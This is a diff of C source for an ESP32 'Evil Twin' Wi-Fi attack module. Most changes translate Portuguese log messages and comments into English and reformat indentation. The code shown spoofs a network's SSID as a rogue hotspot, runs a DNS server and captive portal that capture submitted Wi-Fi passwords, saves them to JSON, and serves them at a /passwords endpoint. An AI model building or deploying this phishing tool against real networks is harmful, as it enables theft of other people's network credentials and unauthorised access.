@@ -76,9 +76,9 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
       cJSON_Delete(root_array);
 
       xSemaphoreGive(storage_mutex); 
-      ESP_LOGI(TAG, "Senha salva com sucesso no JSON");
+      ESP_LOGI(TAG, "Password successfully saved to JSON");
     } else {
-      ESP_LOGE(TAG, "Timeout ao tentar obter Mutex para salvar senha");
+      ESP_LOGE(TAG, "Timeout when attempting to obtain Mutex to save password");
     }
   }
 
@@ -87,16 +87,16 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
     http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
     free(thanks);
   } else {
-    http_service_send_response(req, "<h1>Obrigado!</h1>", HTTPD_RESP_USE_STRLEN);
+    http_service_send_response(req, "<h1>Thank you!</h1>", HTTPD_RESP_USE_STRLEN);
   }
 
   return ESP_OK;
 }
 
 static void init_storage_mutex() {
-    if (storage_mutex == NULL) {
-        storage_mutex = xSemaphoreCreateMutex();
-    }
+  if (storage_mutex == NULL) {
+    storage_mutex = xSemaphoreCreateMutex();
+  }
 }
 
 static esp_err_t passwords_get_handler(httpd_req_t *req) {
@@ -114,19 +114,19 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
     }
   }
 
-  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN); // Retorna array vazio se não houver arquivo
+  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN); // Returns empty array if no file exists
   return ESP_OK;
 }
 
 static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
-    char *html = load_file_dynamic(PATH_HTML_INDEX);
-    if (html) {
-        http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
-        free(html);
-        return ESP_OK;
-    }
-    http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
-    return ESP_FAIL;
+  char *html = load_file_dynamic(PATH_HTML_INDEX);
+  if (html) {
+    http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
+    free(html);
+    return ESP_OK;
+  }
+  http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
+  return ESP_FAIL;
 }
 
 
@@ -151,41 +151,41 @@ static void register_evil_twin_handlers(void) {
   httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
   http_service_register_uri(&submit_uri);
 
-  httpd_uri_t passwords_uri = {.uri = "/senhas", .method = HTTP_GET, .handler = passwords_get_handler};
+  httpd_uri_t passwords_uri = {.uri = "/passwords", .method = HTTP_GET, .handler = passwords_get_handler};
   http_service_register_uri(&passwords_uri);
 
   httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
   http_service_register_uri(&root_uri);
 
   httpd_uri_t captive_portal_uri = {
-      .uri = "/hotspot-detect.html",
-      .method = HTTP_GET,
-      .handler = captive_portal_get_handler,
-      .user_ctx = NULL};
+    .uri = "/hotspot-detect.html",
+    .method = HTTP_GET,
+    .handler = captive_portal_get_handler,
+    .user_ctx = NULL};
   http_service_register_uri(&captive_portal_uri);
 }
 
 void evil_twin_start_attack(const char *ssid) {
   init_storage_mutex(); 
-  ESP_LOGI(TAG, "Iniciando Evil Twin: %s", ssid);
+  ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);
 
   wifi_change_to_hotspot(ssid);
   start_dns_server();
   vTaskDelay(pdMS_TO_TICKS(1000));
 
   register_evil_twin_handlers();
-  ESP_LOGI(TAG, "Ataque ativo e Mutex pronto.");
+  ESP_LOGI(TAG, "Attack active and Mutex ready.");
 }
 
 void evil_twin_stop_attack(void) {
   stop_http_server();
   stop_dns_server();
-  // wifi_service_init(); // Restaura o modo Wi-Fi padrão
+  // wifi_service_init(); // Restores standard Wi-Fi mode
   if (storage_mutex != NULL) {
     vSemaphoreDelete(storage_mutex);
     storage_mutex = NULL; 
   }
-  ESP_LOGI(TAG, "Lógica do Evil Twin parada.");
+  ESP_LOGI(TAG, "Evil Twin logic stopped.");
 }
 
 static char* load_file_dynamic(const char* path) {
